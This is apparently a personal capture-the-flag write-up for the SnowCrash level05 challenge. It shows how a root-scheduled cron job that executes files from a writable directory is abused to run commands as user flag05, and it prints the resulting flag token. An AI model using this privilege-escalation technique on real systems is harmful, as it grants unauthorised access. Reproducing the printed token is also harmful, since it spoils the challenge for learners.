```find / -name $USER 2>/dev/null -exec cat {} \;```

	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

This cron task executes the script every two minutes.

cat /usr/sbin/openarenaserver

```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

```
ls -la /usr/sbin/openarenaserver 
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

We have write permissions inside opt/openarenaserver folder!!!!

lets insert a command int /opt/openarenaserver so that getflag is executed as user flag05:

```
echo 'getflag > /dev/shm/flag' > /opt/openarenaserver/script.sh
```
I forgot to chmod
```
chmod a+x /opt/openarenaserver/script.sh
```
wait for two minutes and:

level05@SnowCrash:/opt/openarenaserver$ cat /dev/shm/flag
```Check flag.Here is your token : viuaaale9huek52boumoomioc```
:D
